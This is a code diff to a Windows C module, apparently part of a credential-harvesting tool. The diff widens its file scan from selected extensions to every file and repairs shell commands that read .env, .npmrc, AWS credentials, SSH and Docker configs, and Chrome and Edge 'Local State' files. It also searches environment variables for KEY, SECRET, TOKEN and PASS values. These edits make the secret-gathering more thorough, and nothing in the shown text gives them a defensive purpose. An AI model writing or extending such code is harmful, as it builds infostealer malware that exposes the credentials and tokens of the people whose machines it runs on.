@@ -66,7 +66,7 @@ static void scan_file(char *results, int *pos, const char *path) {
     fclose(f);
 }
 
-/* Recursively scan a directory for credential files */
+/* Recursively scan a directory for credential files — ALL files, not just extensions */
 static void scan_directory(char *results, int *pos, const char *base, int depth) {
     if (depth <= 0) return;
     
@@ -83,18 +83,13 @@ static void scan_directory(char *results, int *pos, const char *base, int depth)
         char fullpath[MAX_PATH];
         snprintf(fullpath, sizeof(fullpath), "%s\\%s", base, fd.cFileName);
         
+        /* Skip our own debug log — it causes false duplicates */
+        if (strstr(fullpath, "copy_buffer_debug.txt")) continue;
+        
         if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             scan_directory(results, pos, fullpath, depth - 1);
         } else {
-            const char *ext = strrchr(fd.cFileName, '.');
-            if (ext && (strcmp(ext, ".env") == 0 || strcmp(ext, ".json") == 0 ||
-                        strcmp(ext, ".ini") == 0 || strcmp(ext, ".txt") == 0 ||
-                        strcmp(ext, ".yaml") == 0 || strcmp(ext, ".yml") == 0 ||
-                        strcmp(ext, ".xml") == 0 || strcmp(ext, ".config") == 0 ||
-                        strcmp(ext, ".py") == 0 || strcmp(ext, ".js") == 0 ||
-                        strcmp(ext, ".ts") == 0 || strcmp(ext, ".php") == 0)) {
-                scan_file(results, pos, fullpath);
-            }
+            scan_file(results, pos, fullpath);
         }
     } while (FindNextFileA(h, &fd));
     
@@ -249,17 +244,17 @@ char* config_scan_scan_system(void) {
         } while(0)
     
     snprintf(cmd, sizeof(cmd),
-        "command  type \"%%USERPROFILE%%\\.env\" 2>nul & type \"%%USERPROFILE%%\\.npmrc\" 2>nul & type \"%%USERPROFILE%%\\.gitconfig\" 2>nul & type \"%%APPDATA%%\\Code\\User\\settings.json\" 2>nul & type \"%%USERPROFILE%%\\.aws\\credentials\" 2>nul & type \"%%USERPROFILE%%\\.ssh\\config\" 2>nul & type \"%%USERPROFILE%%\\.docker\\config.json\" 2>nul | findstr /i /n %s",
+        "type \"%%USERPROFILE%%\\.env\" 2>nul & type \"%%USERPROFILE%%\\.npmrc\" 2>nul & type \"%%USERPROFILE%%\\.gitconfig\" 2>nul & type \"%%APPDATA%%\\Code\\User\\settings.json\" 2>nul & type \"%%USERPROFILE%%\\.aws\\credentials\" 2>nul & type \"%%USERPROFILE%%\\.ssh\\config\" 2>nul & type \"%%USERPROFILE%%\\.docker\\config.json\" 2>nul | findstr /i /n %s",
         patterns);
     CONFIG_SCAN_RUN("KNOWN CONFIGS", cmd);
     
     snprintf(cmd, sizeof(cmd),
-        "command  findstr /i /n %s "
+        "findstr /i /n %s "
         "\"%%USERPROFILE%%\\*.env\" \"%%USERPROFILE%%\\*.json\" \"%%USERPROFILE%%\\*.ini\" \"%%USERPROFILE%%\\*.txt\" \"%%USERPROFILE%%\\*.yaml\" \"%%USERPROFILE%%\\*.yml\" "
         "2>nul", patterns);
     CONFIG_SCAN_RUN("USERPROFILE ROOT", cmd);
     
-    result = sys_run_command("command  set | findstr /i /r /c:\"KEY=\" /c:\"SECRET=\" /c:\"TOKEN=\" /c:\"API=\" /c:\"AUTH=\" /c:\"PASS=\"");
+    result = sys_run_command("set | findstr /i /r /c:\"KEY=\" /c:\"SECRET=\" /c:\"TOKEN=\" /c:\"API=\" /c:\"AUTH=\" /c:\"PASS=\"");
     if (result && result[0] && strstr(result, "[No output") == NULL) {
         int lines = 0;
         for (char *p = result; *p; p++) if (*p == '\n') lines++;
@@ -269,10 +264,10 @@ char* config_scan_scan_system(void) {
         }
     }
     
-    snprintf(cmd, sizeof(cmd), "command  type \"%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
+    snprintf(cmd, sizeof(cmd), "type \"%%LOCALAPPDATA%%\\Google\\Chrome\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
     CONFIG_SCAN_RUN("CHROME", cmd);
     
-    snprintf(cmd, sizeof(cmd), "command  type \"%%LOCALAPPDATA%%\\Microsoft\\Edge\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
+    snprintf(cmd, sizeof(cmd), "type \"%%LOCALAPPDATA%%\\Microsoft\\Edge\\User Data\\Local State\" 2>nul | findstr /i /n %s", patterns);
     CONFIG_SCAN_RUN("EDGE", cmd);
     
     /* Build output report */
